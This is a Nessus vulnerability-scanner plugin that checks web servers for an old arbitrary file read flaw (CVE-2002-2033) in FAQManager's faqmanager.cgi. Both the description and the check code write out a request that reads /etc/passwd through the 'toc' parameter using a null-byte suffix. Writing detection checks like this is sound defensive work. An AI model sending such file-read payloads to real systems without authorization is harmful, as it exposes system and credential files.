#
# This script was written by Matt Moore <matt.moore@westpoint.ltd.uk>
#
# See the Nessus Scripts License for details
#

# Changes by Tenable:
# - Revised plugin title, added OSVDB ref, changed example domain (1/05/09)
# - Formatting, title enhancement (1/28/10)
# - Added egrep check for root and a second confirmation request if not paranoid (9/24/14)

include("compat.inc");

if (description)
{
 script_id(10837);
 script_version("$Revision: 1.18 $");
 script_cvs_date("$Date: 2014/09/24 16:35:14 $");

 script_cve_id("CVE-2002-2033");
 script_bugtraq_id(3810);
 script_osvdb_id(699);

 script_name(english:"FAQManager 'faqmanager.cgi' 'toc' Parameter Arbitrary File Access");
 script_summary(english:"Tests for the FAQManager arbitrary file reading vulnerability.");

 script_set_attribute(attribute:"synopsis", value:"It is possible to read arbitrary files on the remote host.");
 script_set_attribute(attribute:"description", value:
"FAQManager is a Perl-based CGI for maintaining a list of Frequently
Asked Questions. Using a specially crafted URL, a remote attacker can
use this CGI to view arbitrary files on the web server. For example:
http://www.example.com/cgi-bin/faqmanager.cgi?toc=/etc/passwd%00");
 script_set_attribute(attribute:"solution", value:
"This CGI script is no longer maintained. Consider using a different
FAQ manager script.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2002/01/07");
 script_set_attribute(attribute:"plugin_publication_date", value:"2002/01/25");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2002-2014 Matt Moore");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

# Check starts here

include("audit.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");

port = get_http_port(default:80);

no404 = get_kb_item(string("www/no404/", port));
if (no404) exit(0);

vuln = 0;

if(get_port_state(port))
{
  req = http_get(item:"/cgi-bin/faqmanager.cgi?toc=/etc/passwd%00", port:port);
  r = http_keepalive_send_recv(port:port, data:req);
  if (egrep(pattern:".*root:.*:0:[01]:.*", string:r)) vuln = 1;

  if (vuln && report_paranoia < 2)
  {
    vuln = 0;
    req = http_get(item:"/cgi-bin/faqmanager.cgi", port:port);
    r = http_keepalive_send_recv(port:port, data:req);

    if (!egrep(pattern:".*root:.*:0:[01]:.*", string:r)) vuln = 1;
  }
}

if (vuln) security_warning(port);
else
audit(AUDIT_HOST_NOT, "affected");
